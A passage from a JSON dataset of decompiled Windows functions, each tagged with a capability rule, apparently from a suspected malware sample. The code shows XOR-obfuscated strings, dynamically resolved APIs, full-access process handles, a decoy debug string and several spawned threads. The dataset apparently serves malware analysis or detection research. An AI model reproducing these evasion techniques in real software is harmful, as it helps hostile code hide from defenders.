        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040ba74(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    char cVar3;\n    uint uVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t lpModuleName;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    puVar10 = &var_24h;\n    for (iVar6 = 8; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    var_30h = 0x141c065d;\n    var_2ch = 0x14161d5b;\n    var_28h = CONCAT22(var_28h._2_2_, 0x3714);\n    var_1ch = 0x78787233;\n    var_18h._0_1_ = 0x37;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    lpModuleName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    var_4h = 5;\n    iVar6 = 0;\n    do {\n        puVar1 = iVar6 + lpModuleName;\n        iVar7 = iVar6 % 5;\n        iVar6 = iVar6 + 1;\n        *puVar1 = *(&var_1ch + iVar7) ^ puVar1[&var_30h - lpModuleName];\n    } while (iVar6 < 10);\n    var_34h = 0x19351115;\n    var_30h = 0x2c152a2a;\n    var_2ch = 0x1704202e;\n    var_28h = 0x4777693a;\n    var_1ch = 0x5a596547;\n    var_18h._0_1_ = 0x45;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar6 = lpModuleName;\n    iVar9 = 0;\n    do {\n        puVar1 = iVar9 + iVar7;\n        iVar8 = iVar9 % var_4h;\n        iVar9 = iVar9 + 1;\n        *puVar1 = *(&var_1ch + iVar8) ^ puVar1[&var_34h - iVar7];\n    } while (iVar9 < 0x10);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar7);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n    cVar3 = fcn.0040d356();\n    if (cVar3 != '\\0') {\n        var_8h = (*pcVar5)(0, var_20h, var_24h);\n    }\n    fcn.0040b27a();\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*pcVar2)(0, iVar6);\n    (*pcVar5)(uVar4);\n    return var_8h;\n}\n",
        "token_count": 891
    },
    "0040bc52": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040bc52(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_ch = 0;\n    var_4h = *0x41cd40;\n    fcn.00401000();\n    uVar3 = fcn.00401000();\n    iVar4 = fcn.0040be78(uVar3 & 0xff, 0x41cd40, 0x41cd58, &var_8h);\n    if (iVar4 != 0) {\n        iVar4 = fcn.0040be78(0, 0x41cd40, 0x41cd5c, &var_8h);\n        if (iVar4 != 0) {\n            var_24h = 0x59174c5e;\n            var_20h = 0x4c156b0f;\n            var_1ch._0_2_ = 0x5972;\n            var_18h = 0x59724c70;\n            var_14h._0_2_ = 0x6b77;\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n            iVar7 = 0;\n            do {\n                var_10h = 6;\n                puVar1 = iVar7 + iVar4;\n                iVar6 = iVar7 % 6;\n                iVar7 = iVar7 + 1;\n                *puVar1 = *(&var_18h + iVar6) ^ puVar1[&var_24h - iVar4];\n            } while (iVar7 < 10);\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(*0x41cd5c, iVar4);\n            iVar7 = fcn.0040be78(0, 0x41cd40, 0x41cd50, &var_8h);\n            pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if (iVar7 != 0) {\n                var_4h = var_4h ^ 0x29787279;\n                var_4h = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                iVar7 = fcn.0040be78(0, &var_4h, 0x41cd44, &var_8h);\n                if (iVar7 != 0) {\n                    var_ch = 1;\n                }\n            }\n            uVar5 = (*pcVar2)(0, iVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 700
    },
    "0040c142": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040c142(uint arg_8h)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uchar *puVar9;\n    int32_t iVar10;\n    uint *puVar11;\n    uint var_34ch;\n    uint var_144h;\n    uint var_104h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    int32_t var_b0h;\n    int32_t var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_83h;\n    uint var_7fh;\n    uint var_7bh;\n    uint var_77h;\n    uint var_73h;\n    uint var_6fh;\n    uint var_6bh;\n    ushort var_67h;\n    int32_t var_64h;\n    int32_t var_60h;\n    uint var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uchar var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_c4h = 0x208;\n    (*_sym.imp.KERNEL32.dll_OutputDebugStringA)(\"MP3 file corrupted\");\n    uVar4 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, 0x40c904, 0, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar4);\n    iVar5 = fcn.0040bd9c();\n    if (iVar5 == 0) {\n        fcn.0040b556();\n        fcn.00409885();\n        while (iVar5 = fcn.0040981b(),  iVar5 != 0) {\n            (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n        }\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_VirtualProtect;\n    iVar5 = (*_sym.imp.KERNEL32.dll_VirtualProtect)(str.QQIEQ4_, 0x184, 0x40, &var_b4h);\n    if (iVar5 != 0) {\n        fcn.0040b1f0();\n        (*pcVar2)(str.QQIEQ4_, 0x184, var_b4h, &var_b4h);\n    }\n    puVar9 = 0x41cd60;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    fcn.00403e9e();\n    puVar11 = &var_4ch;\n    for (iVar5 = 0x1c; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    puVar11 = &var_c0h;\n    for (iVar5 = 0xc; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    puVar9 = 0x41cd48;\n    for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    puVar11 = &var_34ch;\n    for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    iVar5 = (*_sym.imp.ADVAPI32.dll_GetUserNameW)(&var_34ch, &var_c4h);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_58h = 5;\n    if (iVar5 != 0) {\n        var_20h = 0x321e3264;\n        var_1ch = 0x4d603101;\n        var_18h = 0x3270447c;\n        var_14h = 0x31013200;\n        var_10h = CONCAT22(var_10h._2_2_, 0x4d32);\n        var_8h = 0x324d3231;\n        var_4h._0_1_ = 0x44;\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n        iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n        iVar10 = 0;\n        var_50h = &var_20h - iVar5;\n        do {\n            puVar1 = iVar10 + iVar5;\n            iVar7 = iVar10 % var_58h;\n            iVar10 = iVar10 + 1;\n            *puVar1 = *(&var_8h + iVar7) ^ puVar1[&var_20h - iVar5];\n        } while (iVar10 < 0x12);\n        (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableW)(iVar5, &var_34ch);\n        uVar4 = (*pcVar2)(0, iVar5);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    }\n    iVar5 = fcn.004037a0();\n    var_64h = 6;\n    if (iVar5 != 0) {\n        if (2 < var_4ch._1_1_) {\n            iVar5 = 0;\n            if (0 < var_4ch._1_1_ - 2) {\n                do {\n                    *0x41cd40 = *0x41cd40 + (&var_40h)[iVar5];\n                    iVar5 = iVar5 + 1;\n                } while (iVar5 < var_4ch._1_1_ - 2);\n            }\n        }\n        *0x41cd40 = *0x41cd40 ^ 0x43103655;\n        iVar5 = fcn.0040bc52();\n        if (iVar5 != 0) {\n            if (*0x41caf4 < 6) {\n                var_a8h = 0x1560092c;\n                var_a4h = 0xb7a275d;\n                var_a0h = 0x722f5d18;\n                var_9ch = 0x2a5d6a73;\n                var_98h = 0x22796174;\n                var_94h = 0x12017c53;\n                var_90h = 0x974532f;\n                var_8ch = 0x72535d6a;\n                var_88h._0_1_ = 6;\n                stack0xffffff75 = 0x8294e78;\n                var_83h = 0x21251807;\n                var_7fh = 0x5d100f08;\n                var_7bh = 0x4090853;\n                var_77h = 0x7372404f;\n                var_73h = 0x7a2b2f1e;\n                var_6fh = 0x53271673;\n                var_6bh = 0x27137308;\n                var_67h = 0x3341;\n                var_8h = 0x51483368;\n                var_4h._0_1_ = 0x66;\n                uVar4 = (*pcVar2)(8, 0x44);\n                iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n                iVar10 = 0;\n                var_50h = &var_a8h - iVar5;\n                do {\n                    puVar1 = iVar10 + iVar5;\n                    iVar7 = iVar10 % var_58h;\n                    iVar10 = iVar10 + 1;\n                    *puVar1 = *(&var_8h + iVar7) ^ puVar1[&var_a8h - iVar5];\n                } while (iVar10 < 0x43);\n            }\n            else {\n                var_1ch = 0x28606327;\n                var_18h = 0x174f5629;\n                var_14h = 0x565e5e1f;\n                var_10h = 0x65610e38;\n                var_38h = 0x65485974;\n                var_34h._0_2_ = 0x6d65;\n                uVar4 = (*pcVar2)(8, 0x11);\n                iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n                iVar10 = 0;\n                var_50h = &var_1ch - iVar5;\n                do {\n                    puVar1 = iVar10 + iVar5;\n                    iVar7 = iVar10 % var_64h;\n                    iVar10 = iVar10 + 1;\n                    *puVar1 = *(&var_38h + iVar7) ^ puVar1[&var_1ch - iVar5];\n                } while (iVar10 < 0x10);\n            }\n            var_c0h = 0xc;\n            var_b8h = 0;\n            var_bch = 0;\n            (*_sym.imp.ADVAPI32.dll_ConvertStringSecurityDescriptorToSecurityDescriptorA)(iVar5, 1, &var_bch, 0);\n            uVar4 = (*pcVar2)(0, iVar5);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        }\n    }\n    *0x41cd54 = fcn.0040c91f();\n    *0x41cd54 = *0x41cd54 & 0xffff;\n    var_40h = 0x29551407;\n    var_3ch = 0x55040137;\n    var_38h = 0x90e3112;\n    var_34h._0_2_ = 0x7642;\n    var_8h = 0x76306c62;\n    var_4h._0_1_ = 0x44;\n    uVar4 = (*pcVar2)(8, 0xf);\n    var_50h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar5 = 0;\n    var_28h = &var_40h - var_50h;\n    do {\n        puVar1 = iVar5 + var_50h;\n        iVar10 = iVar5 % var_58h;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_8h + iVar10) ^ puVar1[&var_40h - var_50h];\n    } while (iVar5 < 0xe);\n    var_40h = 0x59023b25;\n    var_3ch = 0xc233729;\n    var_38h = 0x3b3b2859;\n    var_34h._0_2_ = 0x370e;\n    var_8h = 0x37634f56;\n    var_4h._0_1_ = 0x4d;\n    uVar4 = (*pcVar2)(8, 0xf);\n    var_b0h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar5 = 0;\n    var_28h = &var_40h - var_b0h;\n    do {\n        puVar1 = iVar5 + var_b0h;\n        iVar10 = iVar5 % var_58h;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_8h + iVar10) ^ puVar1[&var_40h - var_b0h];\n    } while (iVar5 < 0xe);\n    var_38h = 0x57113647;\n    var_34h._0_2_ = 0x4b29;\n    var_60h = 0x724e4562;\n    var_5ch._0_2_ = 0x4b4d;\n    uVar4 = (*pcVar2)(8, 7);\n    var_8h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar5 = 0;\n    var_28h = &var_38h - var_8h;\n    do {\n        puVar1 = iVar5 + var_8h;\n        iVar10 = iVar5 % var_64h;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_60h + iVar10) ^ puVar1[&var_38h - var_8h];\n    } while (iVar5 < 6);\n    (*_sym.imp.USER32.dll_wsprintfA)(&var_104h, var_8h, var_50h, *0x41ca50);\n    *0x41cb14 = fcn.0040b02f();\n    *0x41cd54 = 6000;\n    var_54h = CONCAT13(var_54h._3_1_, 0x663576);\n    var_38h = 0x77665153;\n    var_34h._0_2_ = 0x6833;\n    uVar4 = (*pcVar2)(8, 4);\n    var_60h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar5 = 0;\n    var_28h = &var_54h - var_60h;\n    do {\n        puVar1 = iVar5 + var_60h;\n        iVar10 = iVar5 % var_64h;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_38h + iVar10) ^ puVar1[&var_54h - var_60h];\n    } while (iVar5 < 3);\n    (*_sym.imp.USER32.dll_wsprintfA)(&var_144h, var_60h, *0x41cd54);\n    var_30h._0_2_ = 0x1c0e;\n    var_30h._3_1_ = 0xb;\n    var_2ch = 0x4e;\n    var_28h = 0x6e736e7a;\n    var_24h._0_1_ = 0x4e;\n    var_30h._2_1_ = 6;\n    uVar4 = (*pcVar2)(8, 6);\n    var_ach = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar5 = 0;\n    do {\n        puVar1 = iVar5 + var_ach;\n        iVar10 = iVar5 % var_58h;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_28h + iVar10) ^ puVar1[&var_30h - var_ach];\n    } while (iVar5 < 5);\n    var_3ch = 0x311f240c;\n    var_38h = 0x181e081b;\n    var_34h._0_2_ = 0x7431;\n    var_30h._0_2_ = 0x417a;\n    var_30h._2_1_ = 0x71;\n    var_30h._3_1_ = 0x55;\n    var_2ch = 0x74;\n    uVar4 = (*pcVar2)(8, 0xb);\n    var_54h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar10 = 0;\n    iVar5 = var_54h;\n    do {\n        puVar1 = iVar10 + iVar5;\n        iVar5 = iVar10 % var_58h;\n        iVar10 = iVar10 + 1;\n        *puVar1 = *(&var_30h + iVar5) ^ puVar1[&var_3ch - var_54h];\n        iVar5 = var_54h;\n    } while (iVar10 < 10);\n    var_20h = 0x15c0226;\n    var_1ch = 0x560c3903;\n    var_18h = 0xc38000a;\n    var_14h = 0x39010a43;\n    var_10h = 0x730a510a;\n    var_38h = 0x6f35634b;\n    var_34h._0_2_ = CONCAT11(var_34h._1_1_, 0x73);\n    uVar4 = (*pcVar2)(8, 0x15);\n    var_28h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar10 = 0;\n    iVar5 = &var_20h - var_28h;\n    var_30h._0_2_ = iVar5;\n    var_30h._2_1_ = iVar5 >> 0x10;\n    var_30h._3_1_ = iVar5 >> 0x18;\n    do {\n        puVar1 = iVar10 + var_28h;\n        iVar7 = iVar10 % var_58h;\n        iVar10 = iVar10 + 1;\n        *puVar1 = *(&var_38h + iVar7) ^ puVar1[iVar5];\n    } while (iVar10 < 0x14);\n    var_20h = 0x30021b16;\n    var_1ch = 0x13082821;\n    var_18h = 0x2b2b201f;\n    var_14h = 0x201e1514;\n    var_10h = 0x1f37240c;\n    var_ch._0_1_ = 0x6c;\n    var_38h = 0x546c7a44;\n    var_34h._0_2_ = 0x454e;\n    uVar4 = (*pcVar2)(8, 0x16);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar7 = 0;\n    iVar10 = &var_20h - iVar5;\n    var_30h._0_2_ = iVar10;\n    var_30h._2_1_ = iVar10 >> 0x10;\n    var_30h._3_1_ = iVar10 >> 0x18;\n    do {\n        puVar1 = iVar7 + iVar5;\n        iVar8 = iVar7 % var_64h;\n        iVar7 = iVar7 + 1;\n        *puVar1 = *(&var_38h + iVar8) ^ puVar1[iVar10];\n        pcVar2 = _sym.imp.KERNEL32.dll_SetEnvironmentVariableA;\n    } while (iVar7 < 0x15);\n    (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableA)(var_b0h, var_ach);\n    (*pcVar2)(var_54h, &var_104h);\n    (*pcVar2)(var_28h, 0x41ca54);\n    (*pcVar2)(iVar5, &var_144h);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n    puVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    puVar11 = puVar6;\n    for (iVar10 = 0xc; iVar10 != 0; iVar10 = iVar10 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    *puVar6 = 0x20;\n    *0x41cae0 = (*_sym.imp.KERNEL32.dll_CreateEventA)(0, 0, 0, 0);\n    pcVar2 = _sym.imp.KERNEL32.dll_CreateThread;\n    *0x41cd60 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.004033a9, puVar6, 0, 0);\n    *0x41cd64 = (*pcVar2)(0, 0, fcn.0040901a, *0x41cad8, 0, 0);\n    *0x41cd68 = (*pcVar2)(0, 0, fcn.00408ec8, puVar6, 0, 0);\n    *0x41cd6c = (*pcVar2)(0, 0, 0x40e2cc, puVar6, 0, 0);\n    uVar4 = (*pcVar2)(0, 0, fcn.00404dbe, arg_8h, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar4);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*pcVar3)(0, var_28h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_54h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_ach);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_60h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_8h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_b0h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_50h);\n    (*pcVar2)(uVar4);\n    return 0;\n}\n",
        "token_count": 5151
    },
    "0040c91f": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.0040c91f(void)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint unaff_EBX;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint uStack492;\n    uint uStack488;\n    uint uStack484;\n    uint uStack480;\n    uint uStack476;\n    uint32_t uVar8;\n    uchar uStack464;\n    uchar uStack463;\n    ushort uStack462;\n    uint32_t uStack460;\n    uint uStack456;\n    uint uStack452;\n    uint32_t uStack448;\n    uchar auStack408 [404];\n    \n    uStack464 = unaff_EBX;\n    uStack463 = unaff_EBX >> 8;\n    uStack462 = unaff_EBX >> 0x10;\n    uStack476 = &stack0xfffffe68;\n    uVar6 = 0;\n    uStack480 = 0x202;\n    uStack484 = 0x40c940;\n    (*_sym.imp.WS2_32.dll_WSAStartup)();\n    uStack484 = 0;\n    uStack488 = 1;\n    uStack492 = 2;\n    uVar2 = (*_sym.imp.WS2_32.dll_socket)();\n    if (uVar2 != 0xffffffff) {\n        uStack448 = uVar2;\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        uVar6 = iVar3 + 2000U & 0xffff;\n        uVar2 = 0;\n        if (uVar6 < 64000) {\n            uStack452 = 6;\n            uStack464 = 2;\n            uStack463 = 0x50;\n            uStack480 = 0x50333137;\n            uStack476 = CONCAT22(uStack476._2_2_, 0x424b);\n            uVar8 = 0x7e040306;\n            uStack460 = uVar6;\n            do {\n                uVar6 = uVar8;\n                uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n                iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n                uVar2 = uStack460;\n                iVar7 = 0;\n                do {\n                    puVar1 = iVar7 + iVar3;\n                    iVar5 = iVar7 % CONCAT22(uStack462, CONCAT11(uStack463, uStack464));\n                    iVar7 = iVar7 + 1;\n                    *puVar1 = (&stack0xfffffe14)[iVar5] ^ puVar1[&stack0xfffffe1c + -iVar3];\n                } while (iVar7 < 10);\n                uVar8 = uVar6;\n                uStack456 = (*_sym.imp.WS2_32.dll_inet_addr)(iVar3);\n                uStack462 = (*_sym.imp.WS2_32.dll_ntohs)(uVar6);\n                uStack464 = 2;\n                uStack463 = 0;\n                iVar7 = (*_sym.imp.WS2_32.dll_bind)(uVar2, &stack0xfffffe30, 0x10);\n                if (iVar7 == 0) {\n                    (*_sym.imp.WS2_32.dll_closesocket)(uVar2);\n                    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                    uVar2 = (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                    break;\n                }\n                uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                uVar6 = uVar6 + 1;\n                uVar2 = 0;\n                uStack460 = uVar6;\n            } while (uVar6 < 64000);\n        }\n    }\n    return uVar2 & 0xffff0000 | uVar6 & 0xffff;\n}\n",
        "token_count": 914
    },
    "0040dc8b": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0040dc8b(void)\n\n{\n    uint8_t *puVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int16_t *piVar6;\n    int32_t iVar7;\n    int16_t *piVar8;\n    int32_t iVar9;\n    code *pcVar10;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar5 = *0x41cad8;\n    iVar9 = 0;\n    var_4h = 0;\n    var_8h = 0;\n    var_18h = 0;\n    iVar3 = fcn.0040ddb0(&var_8h);\n    if (iVar3 != 0) {\n        iVar4 = (*_sym.imp.SHLWAPI.dll_StrDupW)(uVar5);\n        var_14h = iVar4;\n        var_10h = fcn.00403538();\n        iVar3 = iVar9;\n        pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (var_10h != 0) {\n            var_2ch = 0x4828384c;\n            var_28h = 0x3804572b;\n            var_24h._0_2_ = 0x4841;\n            var_20h = 0x48413862;\n            var_1ch._0_2_ = 0x5745;\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            piVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n            iVar4 = var_14h;\n            iVar3 = var_18h;\n            do {\n                var_ch = 6;\n                puVar1 = iVar9 + piVar6;\n                iVar7 = iVar9 % 6;\n                iVar9 = iVar9 + 1;\n                *puVar1 = *(&var_20h + iVar7) ^ puVar1[&var_2ch - piVar6];\n            } while (iVar9 < 10);\n            piVar8 = piVar6;\n            do {\n                iVar2 = *piVar8;\n                *((var_10h - piVar6) + piVar8) = iVar2;\n                pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                piVar8 = piVar8 + 1;\n            } while (iVar2 != 0);\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar6);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n        }\n        iVar7 = fcn.00405811(var_8h);\n        iVar9 = iVar3;\n        if (iVar7 == 0) {\n            iVar3 = fcn.0040debc();\n            if (iVar3 != 0) {\n                iVar9 = 1;\n            }\n        }\n        if (iVar4 != 0) {\n            uVar5 = (*pcVar10)(0, iVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n        }\n        uVar5 = (*pcVar10)(0, var_4h);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    }\n    return iVar9;\n}\n",
        "token_count": 826
    },
    "0040e2e3": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040e2e3(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpModuleName;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h = 0x141c065d;\n    var_20h = 0x14161d5b;\n    var_1ch._0_2_ = 0x3714;\n    var_18h = 0x78787233;\n    var_14h._0_1_ = 0x37;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    lpModuleName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_4h = 5;\n    iVar8 = 0;\n    var_8h = &var_24h - lpModuleName;\n    do {\n        puVar1 = iVar8 + lpModuleName;\n        iVar5 = iVar8 % 5;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_18h + iVar5) ^ puVar1[&var_24h - lpModuleName];\n    } while (iVar8 < 10);\n    var_28h = 0x1f0c210e;\n    var_24h = 0x31063a3d;\n    var_20h = 0x25313b00;\n    var_1ch._0_2_ = 0x6f30;\n    var_18h = 0x6f435654;\n    var_14h._0_1_ = 0x58;\n    uVar2 = (*pcVar3)(8, 0xf);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = lpModuleName;\n    iVar7 = 0;\n    do {\n        puVar1 = iVar7 + iVar5;\n        iVar6 = iVar7 % var_4h;\n        iVar7 = iVar7 + 1;\n        *puVar1 = *(&var_18h + iVar6) ^ puVar1[&var_28h - iVar5];\n    } while (iVar7 < 0xe);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName);\n    pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2, iVar5);\n    uVar2 = (*pcVar3)(var_10h, 0x1f0fff, arg_8h, arg_ch);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    pcVar3 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n    (*pcVar3)(uVar4);\n    return uVar2;\n}\n",
        "token_count": 793
    },
    "0040e650": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
